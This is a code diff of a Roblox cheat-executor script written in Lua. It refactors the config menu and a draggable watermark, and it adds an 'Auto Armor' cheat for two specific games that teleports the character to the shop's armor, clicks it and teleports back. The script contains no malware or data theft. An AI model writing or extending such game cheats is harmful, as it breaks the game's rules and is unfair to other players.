         if not o.common_vars.configName or o.common_vars.configName == "" then o.common_vars.configName = "default" end
         
-        if not isfolder(ConfigFolder) then makefolder(ConfigFolder) end
-        o.common_vars.path = ConfigFolder.."/"..o.common_vars.configName..".cfg"
+        if not isfolder(o.ConfigFolder) then makefolder(o.ConfigFolder) end
+        o.common_vars.path = o.ConfigFolder.."/"..o.common_vars.configName..".cfg"
         writefile(o.common_vars.path, Library:GetConfig())
-        Library.Notification({Name = "Configs", Description = "Configuration '"..o.common_vars.configName.."' has been saved."})
-        ConfigList.Refresh(GetConfigFiles())
+        o.ConfigList.Refresh(GetConfigFiles())
     end
 })
 
 -- Кнопка загрузки
-ConfigSection:Button({
+o.ConfigSection:Button({
     name = "LoadConfig", description = ">_<",
     callback = function()
         o.common_vars.configName = Library.Flags["config_list"]
         if not o.common_vars.configName or o.common_vars.configName == "" then
-            Library.Notification({Name = "Configs", Description = "No config selected"})
             return
         end
         
-        o.common_vars.path = ConfigFolder.."/"..o.common_vars.configName..".cfg"
+        o.common_vars.path = o.ConfigFolder.."/"..o.common_vars.configName..".cfg"
         if isfile(o.common_vars.path) then
             Library.LoadConfig(readfile(o.common_vars.path))
-            Library.Notification({Name = "Configs", Description = "Configuration '"..o.common_vars.configName.."' has been loaded."})
         else
-            Library.Notification({Name = "Configs", Description = "Config file not found"})
-            ConfigList.Refresh(GetConfigFiles())
+            o.ConfigList.Refresh(GetConfigFiles())
         end
     end
 })
 
 -- Кнопка удаления
-ConfigSection:Button({
+o.ConfigSection:Button({
     name = "DeleteConfig", description = ">_<",
     callback = function()
         o.common_vars.configName = Library.Flags["config_list"]
         if not o.common_vars.configName or o.common_vars.configName == "" then
-            Library.Notification({Name = "Configs", Description = "No config selected"})
             return
         end
         
-        o.common_vars.path = ConfigFolder.."/"..o.common_vars.configName..".cfg"
+        o.common_vars.path = o.ConfigFolder.."/"..o.common_vars.configName..".cfg"
         if isfile(o.common_vars.path) then
             delfile(o.common_vars.path)
-            Library.Notification({Name = "Configs", Description = "Configuration '"..o.common_vars.configName.."' has been deleted."})
-            ConfigList.Refresh(GetConfigFiles())
+            o.ConfigList.Refresh(GetConfigFiles())
         else
-            Library.Notification({Name = "Configs", Description = "Config file not found"})
-            ConfigList.Refresh(GetConfigFiles())
+            o.ConfigList.Refresh(GetConfigFiles())
         end
     end
 })
 
 -- Кнопка обновления списка
-ConfigSection:Button({
+o.ConfigSection:Button({
     name = "RefreshList", description = ">_<",
     callback = function()
-        ConfigList.Refresh(GetConfigFiles())
-        Library.Notification({Name = "Configs", Description = "Config list has been updated."})
+        o.ConfigList.Refresh(GetConfigFiles())
     end
 })
 
@@ -761,6 +1994,12 @@ o.watermarkEnabled = false
 o.watermarkGui = nil
 o.watermarkFrame = nil
 o.watermarkStrokeColor = Color3.fromRGB(0, 81, 255) -- Цвет по умолчанию
+o.drag = {
+    dragging = false,
+    dragInput = nil,
+    dragStart = nil,
+    startPos = nil
+}
 
 -- Функция создания/обновления ватермарки
 function CreateWatermark(enabled)
@@ -846,15 +2085,10 @@ function CreateWatermark(enabled)
     o.watermarkText:GetPropertyChangedSignal("Text"):Connect(updateWatermarkSize)
     updateWatermarkSize()
     
-    -- Drag and drop функционал
-    local dragging = false
-    local dragInput
-    local dragStart
-    local startPos
-    
-    local function updateDrag(input)
-        local delta = input.Position - dragStart
-        local newPosition = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    -- Функция для обновления позиции при перетаскивании
+    function o.updateDrag(input)
+        local delta = input.Position - o.drag.dragStart
+        local newPosition = UDim2.new(o.drag.startPos.X.Scale, o.drag.startPos.X.Offset + delta.X, o.drag.startPos.Y.Scale, o.drag.startPos.Y.Offset + delta.Y)
         
         local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
         local tween = o.ts:Create(o.watermarkFrame, tweenInfo, {Position = newPosition})
@@ -863,13 +2097,13 @@ function CreateWatermark(enabled)
     
     o.watermarkFrame.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = o.watermarkFrame.Position
+            o.drag.dragging = true
+            o.drag.dragStart = input.Position
+            o.drag.startPos = o.watermarkFrame.Position
             
             input.Changed:Connect(function()
                 if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
+                    o.drag.dragging = false
                 end
             end)
         end
@@ -877,13 +2111,13 @@ function CreateWatermark(enabled)
     
     o.watermarkFrame.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
+            o.drag.dragInput = input
         end
     end)
     
     o.uis.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            updateDrag(input)
+        if input == o.drag.dragInput and o.drag.dragging then
+            o.updateDrag(input)
         end
     end)
 end
@@ -931,9 +2165,105 @@ LegitBotTab.Set(true)
 spawn(function()
     while task.wait(5) do
         if Window.Visible then
-            ConfigList.Refresh(GetConfigFiles())
+            o.ConfigList.Refresh(GetConfigFiles())
         end
     end
 end)
 
 print("script is loaded. If u paid for this, u are retard")
+
+-- Вкладка Misc и секция Utils
+MiscUtilsSection = MiscTab:Section({name = "Utils", description = ">_<"})
+
+-- Auto Armor logic
+local run = game:GetService("RunService")
+local ws = game:GetService("Workspace")
+local lp = game:GetService("Players").LocalPlayer
+local misc = {}
+local auto_armor = false
+
+misc.auto_armor = function()
+    if not auto_armor then return end
+    local char = lp.Character
+    local placeId = game.PlaceId
+    
+    if placeId == 2788229376 then
+        -- Первая игра - проверяем BodyEffects.Armor
+        if char and char:FindFirstChild("BodyEffects") and char.BodyEffects:FindFirstChild("Armor") then
+            local armorValue = char.BodyEffects.Armor.Value
+            if armorValue < 100 then
+                misc.buying_armor = char:FindFirstChild("HumanoidRootPart") and char.HumanoidRootPart.CFrame
+                local armorShop = ws:FindFirstChild("Ignored") and ws.Ignored:FindFirstChild("Shop")
+                local armorItem = armorShop and armorShop:FindFirstChild("[High-Medium Armor] - $2513")
+                if armorItem and armorItem:FindFirstChild("Head") and armorItem:FindFirstChild("ClickDetector") then
+                    char.HumanoidRootPart.CFrame = armorItem.Head.CFrame
+                    fireclickdetector(armorItem.ClickDetector)
+                    run.RenderStepped:Wait()
+                    char.HumanoidRootPart.CFrame = misc.buying_armor
+                end
+            else
+                misc.buying_armor = nil
+            end
+        end
+    elseif placeId == 71189885129233 then
+        -- Вторая игра - проверяем DataFolder.Information.Armor
+        if lp:FindFirstChild("DataFolder") and lp.DataFolder:FindFirstChild("Information") and lp.DataFolder.Information:FindFirstChild("Armor") then
+            local armorValue = tonumber(lp.DataFolder.Information.Armor.Value) or 0
+            if armorValue < 100 then
+                local armorShop = ws:FindFirstChild("Ignored") and ws.Ignored:FindFirstChild("Shop")
+                
+                local function getSafeArmorShop()
+                    if not armorShop then return nil end
+                    local delHoodArmorOptions = {
+                        {index = 59, name = "Max Armor 1"},
+                        {index = 46, name = "Max Armor 2"},
+                        {index = 63, name = "Max Armor 3"},
+                        {index = 68, name = "Max Armor 4"},
+                        {name = "[Max Armor]", direct = true}
+                    }
+                    
+                    for i, option in ipairs(delHoodArmorOptions) do
+                        local armorObj
+                        if option.direct then
+                            armorObj = armorShop:FindFirstChild(option.name)
+                        else
+                            armorObj = armorShop:GetChildren()[option.index]
+                        end
+                        if armorObj and armorObj:FindFirstChild("Head") and armorObj:FindFirstChild("ClickDetector") then
+                            return armorObj
+                        end
+                    end
+                    
+                    -- Поиск по имени если ничего не найдено
+                    for _, item in pairs(armorShop:GetChildren()) do
+                        if item.Name:lower():find("armor") and item.Name:lower():find("max") and item:FindFirstChild("Head") and item:FindFirstChild("ClickDetector") then
+                            return item
+                        end
+                    end
+                    return nil
+                end
+                
+                local armorItem = getSafeArmorShop()
+                if armorItem then
+                    misc.buying_armor = char:FindFirstChild("HumanoidRootPart") and char.HumanoidRootPart.CFrame
+                    char.HumanoidRootPart.CFrame = armorItem.Head.CFrame
+                    fireclickdetector(armorItem.ClickDetector)
+                    run.RenderStepped:Wait()
+                    char.HumanoidRootPart.CFrame = misc.buying_armor
+                end
+            end
+        end
+    end
+end
+
+run.RenderStepped:Connect(misc.auto_armor)
+
+-- UI Toggle for Auto Armor
+MiscUtilsSection:Toggle({
+    name = "Auto Armor Enabled",
+    default = false,
+    flag = "misc_autoarmor",
+    callback = function(v)
+        auto_armor = v
+    end
+})
